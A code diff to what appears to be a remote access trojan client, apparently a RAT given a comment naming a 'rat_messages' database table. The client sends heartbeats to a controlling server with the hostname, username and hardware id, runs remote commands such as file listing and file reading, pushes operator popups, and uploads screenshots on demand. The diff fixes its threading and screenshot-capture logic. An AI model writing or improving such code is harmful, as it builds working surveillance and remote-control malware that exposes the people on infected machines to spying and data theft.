@@ -137,6 +137,17 @@ def stop_stream():
     global _streaming
     _streaming = False
 
+# ── Screenshot request flag ───────────────────────────────────────────────────
+# The server sets screenshot_requested=true in the heartbeat response.
+# The client checks this flag and only captures when asked — never on its own.
+_screenshot_requested = False
+
+def request_screenshot_check(data):
+    # type: (dict) -> None
+    global _screenshot_requested
+    if data.get("screenshot_requested"):
+        _screenshot_requested = True
+
 # ── ACK a command ─────────────────────────────────────────────────────────────
 def ack_command(session, cmd_id):
     # type: (requests.Session, str) -> None
@@ -353,130 +364,158 @@ def read_text_file(path):
     except Exception as e:
         return "[read error] {}".format(e)
 
-# ── Message popup (PyQt5 with ctypes fallback) ────────────────────────────────
-_pending_replies = []  # type: List[str]
-_popup_lock      = threading.Lock()
-_popup_open      = False
+# ── Message popup ─────────────────────────────────────────────────────────────
+# QApplication MUST live on the main thread — creating it in a daemon thread
+# crashes silently on Windows. We use a queue: the heartbeat thread posts
+# messages here, the main thread's Qt loop picks them up via a QTimer.
+import queue as _queue
+_popup_queue   = _queue.Queue()   # messages waiting to be shown
+_pending_replies = []             
+_popup_lock    = threading.Lock()
 
 def show_message_popup(body):
     # type: (str) -> None
-    global _popup_open
-    with _popup_lock:
-        if _popup_open:
-            _pending_replies.append("[queued] {}".format(body))
-            return
-        _popup_open = True
+    """Called from the heartbeat thread — just enqueues, never touches Qt."""
+    _popup_queue.put(body)
 
-    def _run():
-        global _popup_open
-        try:
-            from PyQt5.QtWidgets import (
-                QApplication, QWidget, QVBoxLayout, QHBoxLayout,
-                QLabel, QLineEdit, QPushButton, QTextEdit, QDesktopWidget,
-            )
-            from PyQt5.QtCore import Qt
+def _make_popup(app, body):
+    # type: (object, str) -> None
+    """Called on the main thread to actually create and show the window."""
+    try:
+        from PyQt5.QtWidgets import (
+            QWidget, QVBoxLayout, QHBoxLayout,
+            QLabel, QLineEdit, QPushButton, QTextEdit, QDesktopWidget,
+        )
+        from PyQt5.QtCore import Qt
 
-            app = QApplication.instance() or QApplication(sys.argv)
+        win = QWidget()
+        win.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)  # type: ignore[arg-type]
+        win.setFixedSize(420, 260)
+        win.setStyleSheet("""
+            QWidget { background: #0d0a0b; color: #e5e3e4; }
+            QTextEdit {
+                background: #161014; border: 1px solid #2e292b;
+                border-radius: 6px; padding: 8px; font-size: 13px; color: #c5c0c2;
+            }
+            QLineEdit {
+                background: #0f0b0c; border: 1px solid #2e292b;
+                border-radius: 6px; padding: 6px 10px; font-size: 12px; color: #c5c0c2;
+            }
+            QLineEdit:focus { border-color: #4e4447; }
+            QPushButton {
+                background: #1c1418; border: 1px solid #2e292b;
+                border-radius: 6px; padding: 6px 16px; font-size: 12px; color: #868283;
+            }
+            QPushButton:hover { background: #2a1a1b; color: #e5e3e4; border-color: #4a4448; }
+            QPushButton#send {
+                background: rgba(220,38,37,0.12); border-color: #dc262544; color: #dc2625;
+            }
+            QPushButton#send:hover { background: rgba(220,38,37,0.22); }
+        """)
 
-            win = QWidget()
-            win.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
-            win.setFixedSize(420, 260)
-            win.setStyleSheet("""
-                QWidget { background: #0d0a0b; color: #e5e3e4; }
-                QTextEdit {
-                    background: #161014; border: 1px solid #2e292b;
-                    border-radius: 6px; padding: 8px; font-size: 13px; color: #c5c0c2;
-                }
-                QLineEdit {
-                    background: #0f0b0c; border: 1px solid #2e292b;
-                    border-radius: 6px; padding: 6px 10px; font-size: 12px; color: #c5c0c2;
-                }
-                QLineEdit:focus { border-color: #4e4447; }
-                QPushButton {
-                    background: #1c1418; border: 1px solid #2e292b;
-                    border-radius: 6px; padding: 6px 16px; font-size: 12px; color: #868283;
-                }
-                QPushButton:hover { background: #2a1a1b; color: #e5e3e4; border-color: #4a4448; }
-                QPushButton#send {
-                    background: rgba(220,38,37,0.12); border-color: #dc262544; color: #dc2625;
-                }
-                QPushButton#send:hover { background: rgba(220,38,37,0.22); }
-            """)
+        layout = QVBoxLayout(win)
+        layout.setContentsMargins(18, 14, 18, 14)
+        layout.setSpacing(10)
 
-            layout = QVBoxLayout(win)
-            layout.setContentsMargins(18, 14, 18, 14)
-            layout.setSpacing(10)
+        title_row = QHBoxLayout()
+        title = QLabel("● Message")
+        title.setStyleSheet("color: #dc2625; font-size: 12px; font-weight: bold;")
+        title_row.addWidget(title)
+        title_row.addStretch()
+        layout.addLayout(title_row)
 
-            title_row = QHBoxLayout()
-            title = QLabel("● Message")
-            title.setStyleSheet("color: #dc2625; font-size: 12px; font-weight: bold;")
-            title_row.addWidget(title)
-            title_row.addStretch()
-            layout.addLayout(title_row)
+        msg_box = QTextEdit()
+        msg_box.setReadOnly(True)
+        msg_box.setPlainText(body)
+        msg_box.setFixedHeight(100)
+        layout.addWidget(msg_box)
 
-            msg_box = QTextEdit()
-            msg_box.setReadOnly(True)
-            msg_box.setPlainText(body)
-            msg_box.setFixedHeight(100)
-            layout.addWidget(msg_box)
+        reply_input = QLineEdit()
+        reply_input.setPlaceholderText("Type a reply… (optional)")
+        layout.addWidget(reply_input)
 
-            reply_input = QLineEdit()
-            reply_input.setPlaceholderText("Type a reply… (optional)")
-            layout.addWidget(reply_input)
+        btn_row = QHBoxLayout()
+        btn_row.addStretch()
+        dismiss_btn = QPushButton("Dismiss")
+        send_btn    = QPushButton("Send Reply")
+        send_btn.setObjectName("send")
+        btn_row.addWidget(dismiss_btn)
+        btn_row.addWidget(send_btn)
+        layout.addLayout(btn_row)
 
-            btn_row = QHBoxLayout()
-            btn_row.addStretch()
-            dismiss_btn = QPushButton("Dismiss")
-            send_btn    = QPushButton("Send Reply")
-            send_btn.setObjectName("send")
-            btn_row.addWidget(dismiss_btn)
-            btn_row.addWidget(send_btn)
-            layout.addLayout(btn_row)
+        win._drag_pos = None  # type: ignore[attr-defined]
+        def mousePressEvent(e):
+            if e.button() == Qt.LeftButton:  # type: ignore[attr-defined]
+                win._drag_pos = e.globalPos() - win.frameGeometry().topLeft()  # type: ignore[attr-defined]
+        def mouseMoveEvent(e):
+            if win._drag_pos and e.buttons() == Qt.LeftButton:  # type: ignore[attr-defined]
+                win.move(e.globalPos() - win._drag_pos)  # type: ignore[attr-defined]
+        win.mousePressEvent = mousePressEvent  # type: ignore[method-assign]
+        win.mouseMoveEvent  = mouseMoveEvent   # type: ignore[method-assign]
 
-            win._drag_pos = None
-            def mousePressEvent(e):
-                if e.button() == Qt.LeftButton:
-                    win._drag_pos = e.globalPos() - win.frameGeometry().topLeft()
-            def mouseMoveEvent(e):
-                if win._drag_pos and e.buttons() == Qt.LeftButton:
-                    win.move(e.globalPos() - win._drag_pos)
-            win.mousePressEvent = mousePressEvent
-            win.mouseMoveEvent  = mouseMoveEvent
+        screen = QDesktopWidget().screenGeometry()
+        win.move(
+            (screen.width()  - win.width())  // 2,
+            (screen.height() - win.height()) // 2,
+        )
 
-            screen = QDesktopWidget().screenGeometry()
-            win.move(
-                (screen.width()  - win.width())  // 2,
-                (screen.height() - win.height()) // 2,
-            )
+        def on_send():
+            reply = reply_input.text().strip()
+            if reply:
+                with _popup_lock:
+                    _pending_replies.append(reply)
+            win.close()
 
-            def on_send():
-                reply = reply_input.text().strip()
-                if reply:
-                    with _popup_lock:
-                        _pending_replies.append(reply)
-                win.close()
+        def on_dismiss():
+            win.close()
 
-            def on_dismiss():
-                win.close()
+        send_btn.clicked.connect(on_send)
+        dismiss_btn.clicked.connect(on_dismiss)
+        reply_input.returnPressed.connect(on_send)
 
-            send_btn.clicked.connect(on_send)
-            dismiss_btn.clicked.connect(on_dismiss)
-            reply_input.returnPressed.connect(on_send)
+        win.show()
+    except Exception:
+        pass
 
-            win.show()
-            app.exec_()
+def run_qt_main_loop():
+    # type: () -> None
+    """
+    Runs on the main thread. Starts a QApplication and a QTimer that drains
+    _popup_queue every 200 ms so popups always open on the main thread.
+    Falls back to ctypes if PyQt5 isn't installed.
+    """
+    try:
+        from PyQt5.QtWidgets import QApplication
+        from PyQt5.QtCore import QTimer
 
-        except Exception:
+        app = QApplication(sys.argv)
+
+        def _drain():
+            while not _popup_queue.empty():
+                try:
+                    body = _popup_queue.get_nowait()
+                    _make_popup(app, body)
+                except _queue.Empty:
+                    break
+
+        timer = QTimer()
+        timer.timeout.connect(_drain)
+        timer.start(200)   # check for new messages every 200 ms
+
+        app.exec_()
+
+    except ImportError:
+        # PyQt5 not available — fall back to a plain ctypes loop
+        while True:
             try:
-                import ctypes
-                ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40)
-            except Exception:
+                body = _popup_queue.get(timeout=1)
+                try:
+                    import ctypes
+                    ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40)  # type: ignore[attr-defined]
+                except Exception:
+                    pass
+            except _queue.Empty:
                 pass
-        finally:
-            with _popup_lock:
-                _popup_open = False
-
-    threading.Thread(target=_run, daemon=True).start()
 
 # ── Command handler ───────────────────────────────────────────────────────────
 def handle_command(cmd):
@@ -512,7 +551,9 @@ def handle_command(cmd):
         body = payload.get("body") or payload.get("text", "")
         if body:
             show_message_popup(body)
-        result["message_reply"] = body
+        # Do NOT set result["message_reply"] here — the server already inserted
+        # the admin message into rat_messages when the command was queued.
+        # Returning message_reply would cause a duplicate 'agent' row in the DB.
 
     elif ctype == "file_list":
         path = payload.get("path") or str(Path.home())
@@ -594,8 +635,8 @@ def handle_command(cmd):
 
     return result
 
-# ── Main heartbeat loop ───────────────────────────────────────────────────────
-def run():
+# ── Heartbeat loop (runs in a background thread) ──────────────────────────────
+def _heartbeat_loop():
     global _session_ref
     session = requests.Session()
     session.headers.update({"Content-Type": "application/json"})
@@ -626,6 +667,27 @@ def run():
                 # Sync blocked sites from server
                 sync_blocked(data.get("blocked_sites", []))
 
+                # FIX: only take a screenshot when the server explicitly requests one.
+                # The server sets screenshot_requested=true when the dashboard button is clicked.
+                # Without this check the client was capturing on every heartbeat.
+                if data.get("screenshot_requested"):
+                    b64 = capture_screenshot()
+                    if b64:
+                        try:
+                            session.post(
+                                HEARTBEAT_URL,
+                                json={
+                                    "hostname": HOSTNAME,
+                                    "username": USERNAME,
+                                    "platform": PLATFORM,
+                                    "hwid":     HWID,
+                                    "screenshot_b64": b64,
+                                },
+                                timeout=15,
+                            )
+                        except Exception:
+                            pass
+
                 # Handle each pending command then ACK immediately
                 for cmd in data.get("commands", []):
                     cmd_id = cmd.get("id")
@@ -634,7 +696,7 @@ def run():
                     except Exception:
                         extra = {"message_reply": traceback.format_exc()[:2000]}
 
-                    # ACK first so it is never re-delivered even if result send fails
+                    # ACK first — never re-delivered even if result POST fails
                     if cmd_id:
                         ack_command(session, cmd_id)
 
@@ -664,4 +726,9 @@ def run():
 
 
 if __name__ == "__main__":
-    run()
+    # FIX: QApplication must run on the main thread.
+    # Start the heartbeat in a background daemon thread, then hand the main
+    # thread to the Qt event loop (or the ctypes fallback loop).
+    t = threading.Thread(target=_heartbeat_loop, daemon=True)
+    t.start()
+    run_qt_main_loop()
